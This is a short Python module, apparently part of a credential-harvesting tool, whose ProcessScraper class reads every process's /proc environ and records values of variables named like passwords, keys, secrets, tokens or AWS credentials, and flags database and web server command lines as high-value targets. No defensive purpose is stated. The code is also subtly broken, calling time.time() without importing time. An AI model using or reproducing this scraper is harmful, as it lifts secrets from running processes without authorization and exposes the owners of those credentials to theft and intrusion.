"""
Scrape /proc for environment variables, command lines, and memory.
"""
import os
import re
import glob
from typing import List, Dict

class ProcessScraper:
    def __init__(self):
        self.proc_dir = '/proc'

    def scrape(self):
        """Return list of findings from process memory and environ."""
        findings = []
        # Iterate over all PIDs
        for pid_dir in glob.glob(f'{self.proc_dir}/[0-9]*'):
            pid = os.path.basename(pid_dir)
            # Read environ
            environ_path = os.path.join(pid_dir, 'environ')
            try:
                with open(environ_path, 'rb') as f:
                    data = f.read()
                # Split by null bytes
                env_vars = data.split(b'\x00')
                for var in env_vars:
                    if b'=' in var:
                        key, value = var.split(b'=', 1)
                        key_str = key.decode('utf-8', errors='ignore')
                        if any(k in key_str.upper() for k in ['PASS', 'KEY', 'SECRET', 'TOKEN', 'AWS']):
                            findings.append({
                                'file_path': f'/proc/{pid}/environ',
                                'matched_regex': f'Environment variable: {key_str}',
                                'encrypted_content': value.decode('utf-8', errors='ignore'),
                                'confidence_score': 0.9,
                                'timestamp': time.time()
                            })
            except:
                pass
            # Read cmdline
            cmdline_path = os.path.join(pid_dir, 'cmdline')
            try:
                with open(cmdline_path, 'rb') as f:
                    cmdline = f.read().replace(b'\x00', b' ').decode('utf-8', errors='ignore')
                # Check for suspicious keywords
                if any(k in cmdline for k in ['mysql', 'postgres', 'nginx', 'apache']):
                    # Possibly high-value process
                    findings.append({
                        'file_path': f'/proc/{pid}/cmdline',
                        'matched_regex': f'Process: {cmdline}',
                        'encrypted_content': cmdline,
                        'confidence_score': 0.7,
                        'timestamp': time.time()
                    })
            except:
                pass
        return findings
